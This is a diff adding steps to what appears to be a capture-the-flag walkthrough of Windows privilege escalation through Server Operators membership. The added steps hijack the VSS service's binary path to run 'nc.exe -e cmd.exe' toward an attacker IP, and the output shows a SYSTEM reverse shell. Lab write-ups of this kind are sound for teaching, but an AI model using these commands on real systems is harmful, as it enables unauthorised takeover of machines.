@@ -173,7 +173,48 @@ Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
 Can see that the user `svc-printer` is a member of the `Server Operators` [group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators). Members of the Server Operators group can sign in to a server interactively, create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer, and shut down the computer.
 
+1. Started by uploading `nc.exe` to the victim machine.
+2. List `services`:
 
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> services
+```
+
+3. Change the config of an existing service so it uses the netcat instead for it’s binary:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VSS binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.12 4444"
+[SC] ChangeServiceConfig SUCCESS
+```
+
+4. Verify the service has been changed:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> services
+
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------                  
+C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.12 4444                                                          True VSS
+```
+
+5. Start up a netcat reverse shell on kali and then start service:
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VSS
+```
+
+6. Get a reverse shell on netcat:
+
+```bash
+$ nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.11.108] 56212
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
 
 
 
